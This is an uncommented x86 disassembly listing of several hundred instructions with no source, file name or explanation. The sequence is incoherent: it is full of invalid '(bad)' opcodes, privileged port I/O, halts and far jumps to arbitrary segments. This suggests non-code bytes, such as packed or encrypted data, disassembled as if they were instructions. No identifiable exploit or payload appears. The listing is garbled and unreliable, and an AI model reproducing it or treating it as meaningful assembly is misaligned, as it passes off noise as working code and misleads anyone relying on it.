  41dbbd:	mov    al,ds:0xd5dfa797
  41dbc2:	jbe    0x41dbe0
  41dbc4:	ret    
  41dbc5:	add    eax,0x487c8d42
  41dbca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dbcb:	fucomp st(7)
  41dbcd:	xor    al,0xdd
  41dbcf:	int3   
  41dbd0:	in     eax,0x7
  41dbd2:	or     DWORD PTR es:[esi],ebx
  41dbd5:	mov    ds:0x40ffe600,al
  41dbda:	mov    ah,0xb6
  41dbdc:	mov    ecx,0x14c19998
  41dbe1:	mov    dh,0x5a
  41dbe3:	mov    si,0x5f5e
  41dbe7:	xchg   edx,edx
  41dbe9:	mov    esi,0xd42d3dbc
  41dbee:	fisttp WORD PTR [ebx]
  41dbf0:	mov    dh,ch
  41dbf2:	add    eax,0x1b8525b2
  41dbf7:	jg     0x41dc3d
  41dbf9:	dec    eax
  41dbfa:	adc    al,BYTE PTR [ebx]
  41dbfc:	dec    eax
  41dbfd:	mov    ss,WORD PTR [ecx-0x27481200]
  41dc03:	push   ebx
  41dc04:	xor    ebx,ebp
  41dc06:	pop    ebp
  41dc07:	(bad)  
  41dc08:	dec    esp
  41dc09:	call   0x8154:0x79f83f4b
  41dc10:	xor    eax,0x40262b6
  41dc15:	mov    edx,DWORD PTR [eax+0x1d]
  41dc18:	or     ebp,eax
  41dc1a:	xor    ch,BYTE PTR [edi+ebx*8+0x50ff18e]
  41dc21:	rol    BYTE PTR [esi+ebx*2+0xfafca18],0xf2
  41dc29:	cmc    
  41dc2a:	pop    edi
  41dc2b:	jg     0x41dc7e
  41dc2d:	lock cmp eax,0xd0607d85
  41dc33:	jl     0x41dc36
  41dc35:	pop    esi
  41dc36:	inc    ecx
  41dc37:	ret    
  41dc38:	mov    eax,0x213724f4
  41dc3d:	or     eax,0x96b395c
  41dc42:	pop    ss
  41dc43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc44:	jne    0x41dc29
  41dc46:	dec    edx
  41dc47:	rol    BYTE PTR [eax],cl
  41dc49:	push   cs
  41dc4a:	ds dec esi
  41dc4c:	ret    
  41dc4d:	js     0x41dbdf
  41dc4f:	jl     0x41dc65
  41dc51:	lock sub eax,0x2b19c275
  41dc57:	and    al,0xdc
  41dc59:	fwait
  41dc5a:	xchg   ecx,eax
  41dc5b:	xchg   DWORD PTR [esp+esi*4+0x64],edi
  41dc5f:	mov    ebp,0x40e49f28
  41dc64:	int3   
  41dc65:	fdiv   QWORD PTR [edx]
  41dc67:	fnsave [esi-0x16]
  41dc6a:	pop    DWORD PTR [eax]
  41dc6c:	jle    0x41dcba
  41dc6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc6f:	scas   eax,DWORD PTR es:[edi]
  41dc70:	xchg   ebp,eax
  41dc71:	mov    bl,0x5
  41dc73:	or     ch,BYTE PTR [ecx+0x15]
  41dc76:	jae    0x41dc23
  41dc78:	sub    eax,DWORD PTR [eax+0x77de9798]
  41dc7e:	fmul   DWORD PTR [ebx]
  41dc80:	imul   esp,DWORD PTR [ebx],0x15edd27d
  41dc86:	or     dl,BYTE PTR [esi]
  41dc88:	and    al,0xc
  41dc8a:	mov    ds:0x56ce553,eax
  41dc8f:	push   esp
  41dc90:	inc    ebx
  41dc91:	mov    al,0x26
  41dc93:	xchg   BYTE PTR [eax+edi*1+0x48],ch
  41dc97:	cmp    DWORD PTR [eax],esp
  41dc99:	hlt    
  41dc9a:	popf   
  41dc9b:	jecxz  0x41dc47
  41dc9d:	mov    dh,0xe7
  41dc9f:	pusha  
  41dca0:	push   esi
  41dca1:	leave  
  41dca2:	aas    
  41dca3:	push   ebp
  41dca4:	jl     0x41dc83
  41dca6:	or     edi,DWORD PTR [esi+edi*4-0x5f07ea72]
  41dcad:	sti    
  41dcae:	rol    al,0xd6
  41dcb1:	bound  eax,QWORD PTR [eax-0x18]
  41dcb4:	in     al,dx
  41dcb5:	enter  0x365a,0x9b
  41dcb9:	mov    ds:0x65e14148,al
  41dcbe:	(bad)  
  41dcbf:	iret   
  41dcc0:	push   es
  41dcc1:	adc    eax,0xa2cb72bd
  41dcc6:	adc    DWORD PTR [esi],eax
  41dcc8:	push   ds
  41dcc9:	test   BYTE PTR [edi+0x23536be8],dh
  41dccf:	mov    BYTE PTR [ebx+ebp*1-0x21],bl
  41dcd3:	cmp    ah,BYTE PTR [ecx-0x3c52153e]
  41dcd9:	xchg   esi,eax
  41dcda:	xchg   edx,eax
  41dcdb:	pop    edi
  41dcdc:	in     al,dx
  41dcdd:	seto   BYTE PTR [esi-0x7e87e360]
  41dce4:	jecxz  0x41dd5a
  41dce6:	ins    DWORD PTR es:[edi],dx
  41dce7:	push   eax
  41dce9:	xchg   esp,eax
  41dcea:	stc    
  41dceb:	mov    BYTE PTR [ecx],dh
  41dced:	(bad)  
  41dcee:	xchg   ebp,eax
  41dcef:	xor    BYTE PTR [eax],0x7e
  41dcf2:	adc    al,0x41
  41dcf4:	ins    BYTE PTR es:[edi],dx
  41dcf5:	std    
  41dcf6:	cmp    al,0xf0
  41dcf9:	lahf   
  41dcfa:	arpl   WORD PTR [esi+0x6719c02b],bx
  41dd00:	dec    eax
  41dd01:	retf   
  41dd02:	inc    esi
  41dd03:	fnstcw WORD PTR [edx-0x59]
  41dd06:	clc    
  41dd07:	push   edi
  41dd08:	dec    esi
  41dd09:	test   BYTE PTR [eax+eiz*1-0x509f69f8],dh
  41dd10:	inc    eax
  41dd11:	daa    
  41dd12:	add    eax,0xb41783f7
  41dd17:	out    dx,al
  41dd18:	push   es
  41dd19:	dec    ebp
  41dd1a:	mov    al,0xcc
  41dd1c:	daa    
  41dd1d:	sub    ch,0x12
  41dd20:	fdivr  DWORD PTR [eax-0x37]
  41dd23:	push   ss
  41dd24:	adc    ch,BYTE PTR ss:[ebx+eax*1]
  41dd28:	fs sub al,0x70
  41dd2b:	dec    esi
  41dd2c:	adc    eax,DWORD PTR [edx-0x87bf88]
  41dd32:	neg    DWORD PTR [eax]
  41dd34:	xchg   DWORD PTR ds:0x9800aa1b,esp
  41dd3a:	dec    eax
  41dd3b:	ret    0xe232
  41dd3e:	mov    ds:0xa3b4c9cb,al
  41dd43:	into   
  41dd44:	test   al,0x1
  41dd46:	(bad)  
  41dd47:	and    ch,ch
  41dd49:	in     al,dx
  41dd4a:	sub    edi,DWORD PTR ds:0xe8ed26d8
  41dd50:	popa   
  41dd51:	xchg   ecx,eax
  41dd52:	cmp    esp,edx
  41dd54:	cmp    BYTE PTR fs:[ecx],bl
  41dd57:	jmp    0x54e7:0x659cb52
  41dd5e:	int3   
  41dd5f:	dec    edi
  41dd60:	xor    BYTE PTR [esi-0x57],dh
  41dd63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd64:	(bad)  
  41dd65:	out    dx,al
  41dd66:	push   es
  41dd67:	sub    eax,0x23dc736c
  41dd6c:	push   edi
  41dd6d:	enter  0xdf09,0xd4
  41dd71:	xor    eax,0x75bf24e0
  41dd76:	mov    dh,0xd7
  41dd78:	sbb    ecx,DWORD PTR [edi+0x58c40983]
  41dd7e:	inc    edx
  41dd7f:	xor    cl,BYTE PTR [eax-0x4b]
  41dd82:	jge    0x41dd54
  41dd84:	test   BYTE PTR [edx-0x4f],dh
  41dd87:	(bad)  
  41dd88:	adc    cl,ah
  41dd8a:	mov    bl,0x51
  41dd8c:	hlt    
  41dd8d:	sub    esp,edi
  41dd8f:	push   0x63
  41dd91:	inc    ebx
  41dd92:	test   eax,0x632c027d
  41dd97:	loopne 0x41de08
  41dd99:	dec    esp
  41dd9a:	mov    dh,0x2a
  41dd9c:	shl    ch,cl
  41dd9e:	inc    esi
  41dd9f:	xor    dh,BYTE PTR ds:0xb541ca17
  41dda5:	rcl    DWORD PTR [bx+di],cl
  41dda8:	and    bl,BYTE PTR [ecx-0x2e61174c]
  41ddae:	jmp    FWORD PTR [ebx-0x5c8b3f4f]
  41ddb4:	ret    0x4cfb
  41ddb7:	xlat   BYTE PTR ds:[ebx]
  41ddb8:	fwait
  41ddb9:	repnz lods al,BYTE PTR cs:[esi]
  41ddbc:	sbb    al,0xa1
  41ddbe:	push   esp
  41ddbf:	loop   0x41ddf6
  41ddc1:	(bad)  
  41ddc2:	pop    ds
  41ddc3:	jnp    0x41dd69
  41ddc5:	cld    
  41ddc6:	rcl    esp,1
  41ddc8:	test   BYTE PTR [ebp+0x151e89e9],dh
  41ddce:	loop   0x41de30
  41ddd0:	jecxz  0x41dd53
  41ddd2:	ins    BYTE PTR es:[edi],dx
  41ddd3:	push   esp
  41ddd4:	pop    ds
  41ddd5:	and    eax,0xfd1260e5
  41ddda:	cwde   
  41dddb:	xchg   edi,eax
  41dddc:	out    0x3d,al
  41ddde:	(bad)  
  41dddf:	(bad)  [ebp-0x4c]
  41dde2:	dec    edi
  41dde3:	mov    ch,BYTE PTR [ecx-0x42]
  41dde6:	fisubr DWORD PTR [esi-0x9]
  41dde9:	ret    
  41ddea:	mul    BYTE PTR [ebp-0x747bc501]
  41ddf0:	add    bh,BYTE PTR [ecx-0x546e6a98]
  41ddf6:	mov    ecx,esp
  41ddf8:	xchg   ebx,eax
  41ddf9:	out    0x13,al
  41ddfb:	push   ds
  41ddfc:	push   ss
  41ddfd:	mov    edi,0x7442200f
  41de02:	xor    edx,DWORD PTR [ebp+0x3d]
  41de05:	jg     0x41de60
  41de07:	out    dx,eax
  41de08:	or     esp,0x4d
  41de0b:	sbb    al,0xa9
  41de0d:	push   esp
  41de0e:	pushf  
  41de0f:	and    DWORD PTR [edx],ebx
  41de11:	pop    esi
  41de12:	push   0xfffffff3
  41de14:	push   ss
  41de15:	dec    esi
  41de16:	adc    BYTE PTR [edi-0x5d8fe430],0x38
  41de1d:	inc    esi
  41de1e:	shr    BYTE PTR [eax-0x10451632],1
  41de24:	sub    DWORD PTR [ebx-0x31],eax
  41de27:	test   BYTE PTR [ecx+edi*2+0x26262ecf],0xb
  41de2f:	mov    bh,0xe7
  41de31:	and    bl,0x4c
  41de34:	mov    bl,0x48
  41de36:	and    bl,BYTE PTR [esi+0x30abf610]
  41de3c:	mov    esp,DWORD PTR [ecx-0x6edbd53e]
  41de42:	mov    ds:0xc0024060,al
  41de47:	aas    
  41de48:	cmp    DWORD PTR [ebx+0x43155d4b],0xffffffc7
  41de4f:	sub    BYTE PTR [esi],ch
  41de51:	hlt    
  41de52:	fiadd  DWORD PTR [eax-0x61]
  41de55:	jg     0x41ddec
  41de57:	mov    ah,0xfa
  41de59:	jle    0x41deac
  41de5b:	daa    
  41de5c:	add    eax,0xd3320acc
  41de61:	iret   
  41de62:	sbb    BYTE PTR [edi-0xda39c9d],bl
  41de68:	mov    ds:0x2ed34b0c,eax
  41de6d:	push   edx
  41de6e:	mov    ebx,0xe981b5d6
  41de73:	jne    0x41dec1
  41de75:	push   edx
  41de76:	mov    ds:0x5c710f3d,al
  41de7b:	ss repz std 
  41de7e:	or     BYTE PTR [edi-0x7df594ca],dl
  41de84:	aas    
  41de85:	repz test DWORD PTR [ecx+0x43],esp
  41de89:	dec    edx
  41de8a:	jmp    0x38b9cea2
  41de8f:	mov    al,0x17
  41de91:	xchg   ecx,eax
  41de92:	cmp    dl,BYTE PTR [eax-0x2d9ce9f8]
  41de98:	and    ebx,DWORD PTR [esi-0x7f]
  41de9b:	or     ch,bl
  41de9d:	popa   
  41de9e:	or     BYTE PTR [ebp+0x6c],0xe1
  41dea2:	xchg   edx,eax
  41dea3:	jns    0x41df04
  41dea5:	ret    0x4b51
  41dea8:	out    0xe8,al
  41deaa:	sbb    BYTE PTR [esi],cl
  41deac:	jns    0x41df06
  41deae:	add    edx,ebp
  41deb0:	push   es
  41deb1:	adc    ch,BYTE PTR [eax+0x7d73a029]
  41deb7:	fidivr DWORD PTR [edi-0x20]
  41deba:	stc    
  41debb:	inc    esi
  41debc:	mov    eax,ds:0x344ca42e
  41dec1:	cli    
  41dec2:	dec    ecx
  41dec3:	mov    eax,0x13de5eb0
  41dec8:	jecxz  0x41deb7
  41deca:	and    BYTE PTR [edx-0x1e86a6f0],dh
  41ded0:	jns    0x41dee6
  41ded2:	mov    edi,0x170c06ed
  41ded7:	(bad)  
  41ded8:	shl    BYTE PTR [ecx+0x727d6335],cl
  41dede:	add    BYTE PTR [eax],al
  41dee0:	add    BYTE PTR [eax],al
  41dee2:	loope  0x41de68
  41dee4:	xchg   al,dh
  41dee6:	out    0xf2,eax
  41dee8:	not    DWORD PTR [ebp-0x25c4ffdf]
  41deee:	xchg   DWORD PTR [edx],edi
  41def0:	ja     0x41df2d
  41def2:	xor    eax,0xf400015a
  41def7:	add    al,0x0
  41def9:	add    BYTE PTR [edx+0x47660287],ah
  41deff:	pusha  
  41df00:	or     bl,BYTE PTR [edi+0x15]
  41df03:	mov    ch,0x5c
  41df05:	sub    BYTE PTR [esi+ecx*1-0x31],cl
  41df09:	mov    eax,ds:0x956b0137
  41df0e:	add    edx,ebp
  41df10:	fadd   DWORD PTR [ecx]
  41df12:	nop
  41df13:	jle    0x41deaf
  41df15:	mov    al,ds:0x7b9eaeb6
  41df1a:	rcl    BYTE PTR [edx],0x12
  41df1d:	mov    al,0x4b
  41df1f:	jb     0x41df9e
  41df21:	mov    eax,0x4e7fc987
  41df26:	push   ebp
  41df27:	nop
  41df28:	(bad)  
  41df29:	pop    esp
  41df2a:	bound  edx,QWORD PTR [ebp-0x376cac91]
  41df30:	adc    eax,0x8e972646
  41df35:	mov    eax,0x84c2c1a7
  41df3a:	add    DWORD PTR [edx+0x660426b0],ecx
  41df40:	imul   edx,ecx,0x61
  41df43:	popa   
  41df44:	and    DWORD PTR [eax+esi*8],eax
  41df47:	push   ebp
  41df48:	bound  edi,QWORD PTR [ebp-0x1e3767d2]
  41df4e:	cmc    
  41df4f:	nop
  41df50:	daa    
  41df51:	dec    ecx
  41df52:	add    dh,BYTE PTR [ebx]
  41df54:	cmp    eax,0x7994d185
  41df59:	xor    al,0xfe
  41df5b:	jnp    0x41df99
  41df5d:	shl    BYTE PTR [edi+0x4989afd9],cl
  41df63:	ja     0x41df2c
  41df65:	mov    cl,ah
  41df67:	pop    DWORD PTR [edi-0x28c8aab0]
  41df6d:	add    eax,0x21baafcc
  41df72:	neg    DWORD PTR [esp+edi*4-0x6ecd2dcb]
  41df79:	jnp    0x41df93
  41df7b:	inc    edi
  41df7c:	stos   DWORD PTR es:[edi],eax
  41df7d:	(bad)  
  41df7e:	pop    edi
  41df7f:	mov    ds:0x69dd3a38,eax
  41df84:	sbb    bh,BYTE PTR [ebx+0x73]
  41df87:	ja     0x41dfaf
  41df89:	(bad)  
  41df8a:	sahf   
  41df8b:	test   DWORD PTR [edx+0x18],ebp
  41df8e:	push   ebx
  41df8f:	into   
  41df90:	mov    ch,BYTE PTR [esi+0x3bb3331c]
  41df96:	into   
  41df97:	jp     0x41df2b
  41df99:	dec    esp
  41df9a:	jmp    0x85c8141f
  41df9f:	jb     0x41e008
  41dfa1:	rcr    BYTE PTR [edi+0x49a678f3],0x95
  41dfa8:	mov    al,ds:0x54cf9b55
  41dfad:	cli    
  41dfae:	(bad)  
  41dfaf:	jmp    0x41df59
  41dfb1:	dec    eax
  41dfb2:	mov    ebx,0xde2377cb
  41dfb7:	add    eax,0xf8bd45bc
  41dfbc:	mov    ds:0x27ab0ef7,al
  41dfc1:	sub    BYTE PTR [ebx+0x65],0xc0
  41dfc5:	jo     0x41dfb2
  41dfc7:	mov    dh,BYTE PTR [edx+ebx*2+0x6c]
  41dfcb:	inc    edx
  41dfcc:	pop    esp
  41dfcd:	push   ds
  41dfce:	mov    ecx,0x2ac9c698
  41dfd3:	cld    
  41dfd4:	and    bh,BYTE PTR [eax]
  41dfd6:	mov    al,BYTE PTR [ecx-0x80]
  41dfd9:	loope  0x41dfd9
  41dfdb:	test   bh,bh
  41dfdd:	mov    al,0xb5
  41dfdf:	imul   ebp,edi,0xcd34469f
  41dfe5:	push   ecx
  41dfe6:	xor    ch,ah
  41dfe8:	xchg   edx,eax
  41dfe9:	inc    ebp
  41dfea:	lock pop esi
  41dfec:	dec    esp
  41dfed:	sub    BYTE PTR [ebp-0x2d],0x5c
  41dff1:	ss es in al,dx
  41dff4:	jl     0x41df7c
  41dff6:	(bad)  
  41dff7:	mov    WORD PTR [ebp+0x32],es
  41dffa:	jle    0x41dffd
  41dffc:	fisttp WORD PTR [esp+esi*8-0x49]
  41e000:	or     BYTE PTR [eax+0x2fc55f7d],ah
  41e006:	loop   0x41e075
  41e008:	mov    BYTE PTR [esp+edx*1-0x4a],ch
  41e00c:	bound  eax,QWORD PTR [eax+0x3b]
  41e00f:	inc    edx
  41e010:	rol    BYTE PTR [edi-0x63d75719],1
  41e016:	daa    
  41e017:	xor    bh,cl
  41e019:	fistp  WORD PTR [esi-0x17]
  41e01c:	pop    ebp
  41e01d:	or     ah,BYTE PTR [esi+0x5f0d0bb8]
  41e023:	bound  ecx,QWORD PTR [edi]
  41e025:	shl    edi,1
  41e027:	inc    esi
  41e028:	ret    0xc091
  41e02b:	and    BYTE PTR [edx-0x339cfe00],dl
  41e031:	pusha  
  41e032:	push   edi
  41e033:	repnz cmp esi,ebp
  41e036:	inc    esp
  41e037:	daa    
  41e038:	sbb    dh,dl
  41e03a:	xchg   ebx,eax
  41e03b:	adc    eax,0x9f0fda11
  41e040:	stos   BYTE PTR es:[edi],al
  41e041:	sti    
  41e042:	arpl   WORD PTR [esi],dx
  41e044:	jns    0x41e0b2
  41e046:	jmp    0x41e03d
  41e048:	xchg   ecx,eax
  41e049:	retf   
  41e04a:	lods   eax,DWORD PTR ds:[esi]
  41e04b:	jno    0x41dff4
  41e04d:	xchg   edi,eax
  41e04e:	cmp    eax,0x55ca56c
  41e053:	pop    esp
  41e054:	adc    al,0x3b
  41e056:	sub    eax,0x691501dd
  41e05b:	pusha  
  41e05c:	jbe    0x41e06f
  41e05e:	shl    BYTE PTR [edx],1
  41e060:	enter  0xe810,0x5c
  41e064:	xchg   edx,eax
  41e065:	gs adc eax,edx
  41e068:	out    dx,al
  41e069:	mov    ah,0x63
  41e06b:	cmp    esp,DWORD PTR [ebx-0x2c16dd9b]
  41e071:	cmp    DWORD PTR [eax-0x63b229f5],0x6
  41e078:	imul   edx,DWORD PTR [edx+0x6b],0x3371e25e
  41e07f:	xor    al,bl
  41e081:	test   esp,ebx
  41e083:	mov    ebp,DWORD PTR [edi-0x176fcec9]
  41e089:	pop    edi
  41e08a:	mov    dh,0x66
  41e08c:	mov    ebx,0x632e5c3f
  41e091:	mov    bh,dl
  41e093:	and    eax,0x81a79dc5
  41e098:	xchg   esi,eax
  41e099:	aas    
  41e09a:	adc    dh,BYTE PTR [edx]
  41e09c:	ins    DWORD PTR es:[edi],dx
  41e09d:	fnstenv [eax-0x19d0e85c]
  41e0a3:	sub    cl,0x17
  41e0a6:	fs mov eax,0x8914a0a9
  41e0ac:	dec    esp
  41e0ad:	dec    edi
  41e0ae:	out    dx,eax
  41e0af:	in     al,dx
  41e0b0:	je     0x41e0f1
  41e0b2:	jl     0x41e035
  41e0b4:	xchg   edx,eax
  41e0b5:	xor    eax,0xcbf7c96b
  41e0ba:	ja     0x41e099
  41e0bc:	out    0x44,eax
  41e0be:	jmp    0x2159:0x88687525
  41e0c5:	lods   al,BYTE PTR ds:[esi]
  41e0c6:	jae    0x41e06c
  41e0c8:	out    0xef,eax
  41e0ca:	jecxz  0x41e0c7
  41e0cc:	xor    ebx,esi
  41e0ce:	jmp    0x41e0ca
  41e0d0:	leave  
  41e0d1:	jae    0x41e0bc
  41e0d3:	out    0x71,al
  41e0d5:	ja     0x41e065
  41e0d7:	lea    ecx,[eax]
  41e0d9:	test   eax,0xe725157b
  41e0de:	mov    eax,0xe808a294
  41e0e3:	xor    DWORD PTR [esi-0x778c51fd],esp
  41e0e9:	cmp    BYTE PTR [esi+eiz*1+0x45],0xa6
  41e0ee:	push   ebx
  41e0ef:	push   edi
  41e0f0:	add    eax,0x443bc463
  41e0f5:	stos   BYTE PTR es:[edi],al
  41e0f6:	lods   eax,DWORD PTR ds:[esi]
  41e0f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e0f8:	ror    DWORD PTR [eax-0x2577e56],cl
  41e0fe:	mov    ch,bh
  41e100:	ficom  WORD PTR [eax+ebx*4-0x5f]
  41e104:	dec    ecx
  41e105:	stos   BYTE PTR es:[edi],al
  41e106:	dec    ebx
  41e107:	call   DWORD PTR [edx+0x13]
  41e10a:	nop
  41e10b:	into   
  41e10c:	pusha  
  41e10d:	lods   al,BYTE PTR ds:[esi]
  41e10e:	xor    BYTE PTR [ebx-0x5],dh
  41e111:	cmc    
  41e112:	push   0x1895b2f3
  41e117:	clc    
  41e118:	jmp    0x54cc:0xd1390ed8
  41e11f:	sub    ebp,0x31ccfd77
  41e125:	jo     0x41e15c
  41e127:	sub    cl,BYTE PTR [edx]
  41e129:	jnp    0x41e17f
  41e12b:	mov    eax,ds:0xd7fef2bf
  41e130:	out    dx,al
  41e131:	jecxz  0x41e0db
  41e133:	jp     0x41e150
  41e135:	add    al,0xdd
  41e137:	mov    ch,0xdb
  41e139:	repz sti 
  41e13b:	mov    ch,0xb6
  41e13d:	shl    DWORD PTR [esi+edi*1-0x14],1
  41e141:	xor    al,0x4b
  41e143:	mov    ebp,ebx
  41e145:	stc    
  41e146:	sahf   
  41e147:	stc    
  41e148:	cmp    esi,DWORD PTR [esi+0x1]
  41e14b:	jmp    0x41e17c
  41e14d:	push   es
  41e14e:	cmp    eax,0x818f2a9f
  41e153:	push   ecx
  41e154:	test   al,0x68
  41e156:	push   ebx
  41e157:	push   cs
  41e158:	sbb    eax,0x7e2444c0
  41e15d:	jmp    0x609a:0x289f7b3f
  41e164:	ds xchg edx,eax
  41e166:	push   ds
  41e167:	pause  
  41e169:	jae    0x41e0f9
  41e16b:	lock add DWORD PTR ds:[esi-0x2e],0xffffffd4
  41e171:	pusha  
  41e172:	xchg   esp,eax
  41e173:	pop    esp
  41e174:	mov    WORD PTR [edx-0x41],es
  41e177:	jge    0x41e1d5
  41e179:	and    eax,0x80699cb6
  41e17e:	ins    DWORD PTR es:[edi],dx
  41e17f:	sbb    bh,BYTE PTR [ecx+ebx*2]
  41e182:	or     ebx,ecx
  41e184:	test   al,0xe1
  41e186:	in     al,0x8b
  41e188:	retf   0xbc20
  41e18b:	jp     0x41e1f6
  41e18d:	and    DWORD PTR [esp+esi*1-0x31],eax
  41e191:	sahf   
  41e192:	inc    ebx
  41e193:	dec    esp
  41e194:	pop    ds
  41e195:	or     ebp,DWORD PTR [esi]
  41e197:	lahf   
  41e198:	into   
  41e199:	enter  0x361,0x5
  41e19d:	and    DWORD PTR [ecx+0x7690a246],0x9a29886e
  41e1a7:	xchg   esi,ebx
  41e1a9:	pop    ecx
  41e1aa:	(bad)  
  41e1ab:	jl     0x41e14b
  41e1ad:	pop    ebp
  41e1ae:	pusha  
  41e1af:	add    eax,0x8bcb8ecb
  41e1b4:	sbb    al,0x97
  41e1b6:	push   ebx
  41e1b7:	outs   dx,DWORD PTR ds:[esi]
  41e1b8:	ror    BYTE PTR [esi+esi*4+0x20],1
  41e1bc:	push   eax
  41e1bd:	xchg   edx,eax
  41e1be:	xchg   ebp,eax
  41e1bf:	neg    DWORD PTR [ebx+0x6d]
  41e1c2:	and    ecx,DWORD PTR [ebx-0x38]
  41e1c5:	dec    ebp
  41e1c6:	shr    BYTE PTR [eax+edx*8-0x63d80ba4],1
  41e1cd:	ret    
  41e1ce:	adc    dh,al
  41e1d0:	jno    0x41e196
  41e1d2:	loope  0x41e20a
  41e1d4:	icebp  
  41e1d5:	cmp    bh,bh
  41e1d7:	std    
  41e1d8:	sti    
  41e1d9:	xor    BYTE PTR [esi+0x48],cl
  41e1dc:	cmp    BYTE PTR [edx-0x6b3fd023],0x36
  41e1e3:	gs in  eax,dx
  41e1e5:	pop    ds
  41e1e6:	ins    BYTE PTR es:[edi],dx
  41e1e7:	ds cdq 
  41e1e9:	out    dx,al
  41e1ea:	ret    
  41e1eb:	pop    esi
  41e1ec:	jmp    0x933d:0x473910b8
  41e1f3:	jnp    0x41e1a7
  41e1f5:	adc    cl,BYTE PTR [eax+0x314ebb91]
  41e1fb:	fild   WORD PTR [edx]
  41e1fd:	aam    0x11
  41e1ff:	inc    esi
  41e200:	adc    eax,0xbbd0fa3
  41e205:	cdq    
  41e206:	mov    al,ds:0x8c8575f7
  41e20b:	in     al,dx
  41e20c:	add    dh,BYTE PTR [esi+eiz*1]
  41e20f:	mov    dl,0x69
  41e211:	pusha  
  41e212:	int3   
  41e213:	or     bl,BYTE PTR [edi-0x3b]
  41e216:	dec    esi
  41e217:	mov    eax,ds:0x81623d68
  41e21c:	pop    es
  41e21d:	aaa    
  41e21e:	and    BYTE PTR [eax+0x72],0x3a
  41e222:	pop    ds
  41e223:	pusha  
  41e224:	dec    eax
  41e225:	jne    0x41e29b
  41e227:	mov    BYTE PTR [esp+ecx*8+0x7bdbf027],bl
  41e22e:	push   cs
  41e22f:	xchg   ebx,eax
  41e230:	sbb    BYTE PTR [eax-0x2e],cl
  41e233:	pusha  
  41e234:	or     esp,DWORD PTR [ebp+0x52]
  41e237:	inc    ecx
  41e238:	(bad)  
  41e23a:	add    BYTE PTR [ebx-0x39dbb39d],bl
  41e240:	retf   0xea40
  41e243:	sbb    al,BYTE PTR [edx]
  41e245:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e246:	into   
  41e247:	push   ebx
  41e248:	cmp    bl,cl
  41e24a:	push   eax
  41e24b:	(bad)  
  41e24d:	jae    0x41e1ec
  41e24f:	and    dh,BYTE PTR [esi-0x5d]
  41e252:	fcomp  DWORD PTR [edi-0x39d84e6f]
  41e258:	out    0xe,eax
  41e25a:	sbb    DWORD PTR [ecx+0x710e94ed],edx
  41e260:	xchg   ecx,eax
  41e261:	or     DWORD PTR [esi-0x529524cc],esp
  41e267:	shl    DWORD PTR [esi],cl
  41e269:	loope  0x41e2d5
  41e26b:	and    edi,DWORD PTR [edx-0x7e14d9d2]
  41e271:	cmp    edx,ecx
  41e273:	test   al,0x25
  41e275:	mov    eax,ds:0x9c627611
  41e27a:	jns    0x41e1fe
  41e27c:	sbb    BYTE PTR [ebx+0x1f283f26],ch
  41e282:	jo     0x41e21c
  41e284:	add    BYTE PTR [esi+0x13],bh
  41e287:	xchg   edi,ebp
  41e289:	mov    ah,0xab
  41e28b:	(bad)  
  41e28c:	stc    
  41e28d:	lods   al,BYTE PTR ds:[esi]
  41e28e:	xor    eax,0x6293b1d9
  41e293:	inc    esi
  41e294:	pop    esp
  41e295:	out    0x2b,eax
  41e297:	cli    
  41e298:	(bad)  
  41e299:	fidiv  DWORD PTR [ebx+0x5c]
  41e29c:	arpl   bx,dx
  41e29e:	retf   0x5bd0
  41e2a1:	fwait
  41e2a2:	and    BYTE PTR [edi-0x1a383edc],al
  41e2a8:	mov    ebp,0x24ffb3ca
  41e2ad:	pop    edi
  41e2ae:	add    DWORD PTR [eax],ecx
  41e2b0:	daa    
  41e2b1:	rol    ch,cl
  41e2b3:	gs inc edi
  41e2b5:	fnstenv [edi-0x2c313a28]
  41e2bb:	sub    bl,cl
  41e2bd:	xor    al,0x80
  41e2bf:	(bad)  
  41e2c1:	or     BYTE PTR ds:0x77dc46dc,dl
  41e2c7:	fimul  DWORD PTR [ebp-0x23b75ecd]
  41e2cd:	jmp    0x41e305
  41e2cf:	(bad)  
  41e2d0:	xor    bh,al
  41e2d2:	mov    BYTE PTR [edx],dl
  41e2d4:	sbb    DWORD PTR [ecx+0x559aefd7],0x25d9e1f7
  41e2de:	inc    eax
  41e2df:	lods   al,BYTE PTR ds:[esi]
  41e2e0:	xchg   ebp,eax
  41e2e1:	mov    al,ds:0x59377909
  41e2e6:	hlt    
  41e2e7:	int    0x21
  41e2e9:	adc    BYTE PTR [ebp+esi*4-0x5fcb091f],0x39
  41e2f1:	call   0xcff061f4
  41e2f6:	dec    edi
  41e2f7:	les    ebx,FWORD PTR [edx+0x3f]
  41e2fa:	jg     0x41e33d
  41e2fc:	and    bl,BYTE PTR [esi]
  41e2fe:	ja     0x41e322
  41e300:	inc    edx
  41e301:	fbld   TBYTE PTR [ebp-0x1b]
  41e304:	push   ebx
  41e305:	into   
  41e306:	and    al,0xcc
  41e308:	mov    ebp,0x8183c154
  41e30d:	js     0x41e2e7
  41e30f:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41e311:	push   edx
  41e312:	addr16 pop eax
  41e314:	mov    ah,BYTE PTR [eax-0x74bd469b]
  41e31a:	jecxz  0x41e36e
  41e31c:	sub    DWORD PTR [ebx+0x5b],eax
  41e31f:	mov    BYTE PTR [esi+0x24],bl
  41e322:	cmc    
  41e323:	test   al,0xf2
  41e325:	fimul  WORD PTR [ebx+0x44dd9c1e]
  41e32b:	mov    edi,0x8d6d303b
  41e330:	mov    eax,ebx
  41e332:	out    0xdf,eax
  41e334:	sbb    bh,cl
  41e336:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e337:	or     eax,0x5b2e79a
  41e33c:	ret    0xcdd8
  41e33f:	es sbb eax,0x5977cecc
  41e345:	bsr    esp,DWORD PTR [edi+0x45cd1c92]
  41e34c:	sub    al,0x7
  41e34e:	mov    ebx,0xa4fbdd1d
  41e353:	loopne 0x41e39c
  41e355:	aad    0xb4
  41e357:	mov    bl,0x3
  41e359:	retf   
  41e35a:	add    eax,0xeabb0431
  41e35f:	or     esi,DWORD PTR [ebx+0x26]
  41e362:	xor    edi,DWORD PTR [ebx+0x6bbadb96]
  41e368:	push   esi
  41e369:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
